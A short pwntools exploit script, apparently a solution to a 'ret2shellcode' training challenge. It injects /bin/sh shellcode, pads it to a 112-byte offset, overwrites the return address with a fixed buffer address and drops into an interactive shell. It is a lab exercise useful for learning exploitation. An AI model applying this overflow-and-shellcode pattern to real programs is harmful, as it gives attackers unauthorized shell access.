from pwn import *

sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
offset = 112
buf2_addr = 0x0804A080
##sh.sendline(shellcode.ljust(offset, 'A') + p32(buf2_addr))
shellcode_pad=shellcode+(offset-len(shellcode))*b'A'
sh.sendline(shellcode_pad+p32(buf2_addr))
print('shellcode length = {}'.format(len(shellcode)))
print('shellcode_pad length = {}'.format(len(shellcode_pad)))
sh.interactive() 

